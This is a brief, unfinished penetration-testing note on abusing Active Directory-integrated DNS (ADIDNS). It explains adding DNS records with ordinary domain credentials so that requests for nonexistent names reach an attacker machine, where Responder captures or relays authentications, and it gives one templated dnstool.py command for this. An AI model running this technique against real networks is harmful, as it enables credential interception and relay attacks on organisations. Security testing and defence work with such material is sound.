Secction under development.

# DNS

### ADIDNS

Having domain user credentials you can add records into the local AD local DNS. If you know any machine calling a non existing resource you can create a fake entry that redirect this calls against your machine and capture (or relay) those authentications using Responder.

`python3 dnstool.py -u '<domain>\<user>' -p '<password>' -r <new record> -a add -d <your responder ip> <DC ip>`
